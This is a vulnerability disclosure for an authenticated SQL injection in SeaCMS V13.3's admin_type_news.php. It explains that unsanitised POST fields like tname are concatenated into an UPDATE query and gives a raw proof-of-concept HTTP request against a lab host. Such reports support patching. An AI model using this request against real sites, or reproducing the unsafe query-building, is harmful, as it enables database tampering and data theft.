Seacms V13.3 has an SQL injection vulnerability that allows an authenticated attacker to exploit the database.

Download address：https://www.seacms.com/download/



![image-20250114112543982](images/image-20250114112543982.png)



The vulnerability is located in the admin_type_news.php file, starting from line 99 of the code, first check that the value of the '$action' variable is equal to 'edit', and then check who has no options in the $e_id variable, and then continue to go down into the loop. Inside the loop, the values of various form fields associated with the current ID are retrieved from the POST request, and if they are not empty, an SQL update statement is constructed and executed to update the new field values to the corresponding record in the database's 'sea_type' table. In line 129, you can see that there is a concatenation of SQL statements, and the parameters are requestable, there is no restriction, you can construct 'to close the tname parameter, causing SQL injection problems.



![image-20250114135735721](images/image-20250114135735721.png)



```
POST /seacms/51fek7/admin_type_news.php?action=edit HTTP/1.1
Host: 192.168.80.152
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Referer: http://192.168.80.152/seacms/51fek7/admin_type_news.php
Cookie: PHPSESSID=s5fhh9q24e7k8rjpi28g6o3j40; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MTA6InBocCB8IHBocD8iO3M6MzoiYWxsIjtpOjA7czozOiJodGEiO2k6MTt9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 1058

e_id%5B%5D=17&tname17=%E5%9B%BD%E5%86%85&tenname17=guonei&templist17=newspage.html&templist_117=news.html&keyword17=&description17=&torder17=17&tname18=%E5%9B%BD%E9%99%85&tenname18=guoji&templist18=newspage.html&templist_118=news.html&keyword18=&description18=&torder18=18&tname19=%E7%A4%BE%E4%BC%9A&tenname19=shehui&templist19=newspage.html&templist_119=news.html&keyword19=&description19=&torder19=19&tname20=%E5%86%9B%E4%BA%8B&tenname20=junshi&templist20=newspage.html&templist_120=news.html&keyword20=&description20=&torder20=20&tname21=%E5%A8%B1%E4%B9%90&tenname21=yule&templist21=newspage.html&templist_121=news.html&keyword21=&description21=&torder21=21&tname22=%E5%85%AB%E5%8D%A6&tenname22=bagua&templist22=newspage.html&templist_122=news.html&keyword22=&description22=&torder22=22&tname23=%E7%A7%91%E6%8A%80&tenname23=keji&templist23=newspage.html&templist_123=news.html&keyword23=&description23=&torder23=23&tname24=%E8%B4%A2%E7%BB%8F&tenname24=caijing&templist24=newspage.html&templist_124=news.html&keyword24=&description24=&torder24=24&upid_to=0
```







![image-20250114110220512](images/image-20250114110220512.png)

















